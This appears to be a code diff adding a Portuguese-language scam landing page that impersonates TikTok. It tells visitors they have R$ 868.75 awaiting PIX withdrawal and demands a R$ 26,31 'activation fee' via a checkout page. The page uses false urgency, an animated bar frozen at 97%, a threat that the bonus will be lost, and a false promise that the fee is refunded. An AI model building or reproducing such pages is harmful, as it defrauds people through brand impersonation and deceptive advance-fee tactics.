@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+<script src="/params.js"></script>
+<script src="/api/tt.js"></script>
+    
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TikTok - Saque Liberado</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap');
+        body { font-family: 'Inter', sans-serif; background-color: #FFFFFF; color: #161823; }
+        
+        .progress-bar { 
+            animation: fill 3s cubic-bezier(0.65, 0, 0.35, 1) forwards;
+            background: #FE2C55; 
+        }
+        @keyframes fill { from { width: 0%; } to { width: 97%; } }
+        
+        .success-icon {
+            box-shadow: 0 0 0 0 rgba(105, 201, 208, 0.4);
+            animation: pulse-tiktok 2s infinite;
+        }
+
+        @keyframes pulse-tiktok {
+            0% { box-shadow: 0 0 0 0 rgba(105, 201, 208, 0.4); }
+            70% { box-shadow: 0 0 0 15px rgba(238, 29, 82, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(238, 29, 82, 0); }
+        }
+
+        .btn-tiktok {
+            background-color: #FE2C55;
+            transition: all 0.2s ease;
+        }
+        .btn-tiktok:active { transform: scale(0.96); opacity: 0.9; }
+        
+        /* Ajuste de Nitidez para a Logo */
+        .logo-sharp {
+            filter: contrast(1.1) brightness(1.05);
+            image-rendering: -webkit-optimize-contrast;
+        }
+
+        details summary::-webkit-details-marker { display: none; }
+    </style>
+</head>
+<body class="antialiased">
+
+    <div class="bg-black text-white text-center py-2 px-4 text-[12px] font-bold uppercase tracking-tight w-full sticky top-0 z-50">
+        Caso o pagamento da taxa não seja efetuado, o bônus será doado e a vaga será automaticamente perdida. 
+    </div>
+
+    <div class="max-w-md mx-auto min-h-screen pb-12 bg-white">
+        
+        <div class="px-6 pt-10 pb-8 flex flex-col items-center border-b border-gray-50 bg-white">
+            <img src="https://images.seeklogo.com/logo-png/37/2/tiktok-app-logo-png_seeklogo-375617.png" 
+                 alt="TikTok Logo" 
+                 class="h-28 w-28 object-contain mb-6 logo-sharp drop-shadow-sm">
+            
+            <div class="text-center">
+                <p class="text-[11px] font-bold text-gray-400 uppercase tracking-[0.2em] mb-1">Saldo Total Disponível</p>
+                <h2 class="text-5xl font-[900] text-[#161823] tracking-tighter">R$ 868.75</h2>
+            </div>
+        </div>
+
+        <div class="px-6 py-8">
+            
+            <div class="text-center mb-8">
+                <div class="relative inline-flex mb-6">
+                    <div class="success-icon w-20 h-20 bg-white border-4 border-[#161823] rounded-full flex items-center justify-center relative z-10">
+                        <svg class="w-10 h-10 text-[#25F4EE]" fill="none" stroke="currentColor" viewBox="0 0 24 24" style="filter: drop-shadow(2px 0px 0px #FE2C55);">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="4" d="M5 13l4 4L19 7"></path>
+                        </svg>
+                    </div>
+                    <div class="absolute -top-1 -left-1 w-20 h-20 bg-[#FE2C55] rounded-full opacity-20"></div>
+                    <div class="absolute -bottom-1 -right-1 w-20 h-20 bg-[#25F4EE] rounded-full opacity-20"></div>
+                </div>
+                
+                <h1 class="text-2xl font-black mb-2 italic">PARABÉNS!</h1>
+                <p class="text-gray-500 text-sm leading-relaxed px-4">
+                    Sua conta foi aprovada para saque imediato. O valor de <strong>R$ 868.75</strong> será enviado via PIX.
+                </p>
+            </div>
+
+            <div class="mb-10">
+                <div class="w-full bg-gray-100 h-2 rounded-full overflow-hidden mb-2">
+                    <div class="progress-bar h-full"></div>
+                </div>
+                <div class="flex justify-between items-center">
+                    <p class="text-[10px] font-bold text-[#FE2C55] uppercase tracking-wider">Aguardando Liberação</p>
+                    <p class="text-[10px] font-bold text-gray-400 uppercase">97%</p>
+                </div>
+            </div>
+
+            <div class="space-y-4">
+                <div class="bg-gray-50 rounded-2xl p-6 border border-gray-100">
+                    <p class="text-[14px] text-gray-700 leading-relaxed text-center">
+                        Para liberar o saque e ativar sua conta permanentemente, realize o pagamento da <strong>Taxa Única de Ativação</strong> de <span class="text-black font-black text-lg">R$ 26,31</span>.
+                    </p>
+                </div>
+
+                <button
+  onclick="irParaCheckout(event)"
+  class="btn-tiktok block w-full text-white text-center font-[900] py-5 rounded-full text-xl shadow-2xl uppercase tracking-wider">
+  LIBERAR MEU SAQUE
+</button>
+
+
+                <p class="text-center text-[11px] text-gray-400 font-medium">
+                    * O valor da taxa é reembolsado no ato do saque.
+                </p>
+
+                <div class="mt-8 p-6 bg-black rounded-[2rem] relative overflow-hidden shadow-xl">
+                    <div class="absolute top-0 right-0 p-3">
+                        <span class="bg-[#FE2C55] text-white text-[9px] font-black px-2 py-1 rounded-md uppercase tracking-widest">URGENTE</span>
+                    </div>
+                    <p class="text-gray-400 text-[11px] uppercase font-bold mb-1 tracking-widest">Você receberá no PIX:</p>
+                    <p class="text-4xl font-black text-white tracking-tighter"> R$ 868.75 + Bônus
+</p>
+                    <div class="mt-4 flex items-center gap-2">
+                        <div class="w-2 h-2 bg-[#25F4EE] rounded-full animate-pulse shadow-[0_0_8px_#25F4EE]"></div>
+                        <span class="text-[#25F4EE] text-[10px] font-black uppercase tracking-[0.1em]">Pronto para transferência</span>
+                    </div>
+                </div>
+            </div>
+
+            <div class="mt-10 space-y-2">
+                <details class="group bg-white rounded-xl border border-gray-100 shadow-sm">
+                    <summary class="flex justify-between items-center p-4 cursor-pointer font-bold text-[13px] text-gray-800 uppercase tracking-tight">
+                        Por que existe essa taxa?
+                        <span class="text-[#FE2C55] transition-transform group-open:rotate-45 text-xl">+</span>
+                    </summary>
+                    <div class="px-4 pb-4 text-[13px] text-gray-500 leading-relaxed">
+                        A taxa de ativação serve para autenticar sua chave PIX e garantir que os fundos sejam enviados para o titular correto da conta TikTok.
+                    </div>
+                </details>
+            </div>
+        </div>
+
+        <footer class="py-12 text-center">
+            <p class="text-[10px] text-gray-300 font-bold uppercase tracking-[0.4em]">TikTok Financial © 2026</p>
+        </footer>
+    </div>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+<script src="pix-modal.js"></script>
+<script>
+function irParaCheckout(event) {
+  event.preventDefault();
+  var dest = new URL('checkout.html', window.location.href);
+  new URLSearchParams(window.location.search).forEach(function(v, k) {
+    dest.searchParams.set(k, v);
+  });
+  window.location.href = dest.toString();
+}
+</script>
+
+</body>
+</html>
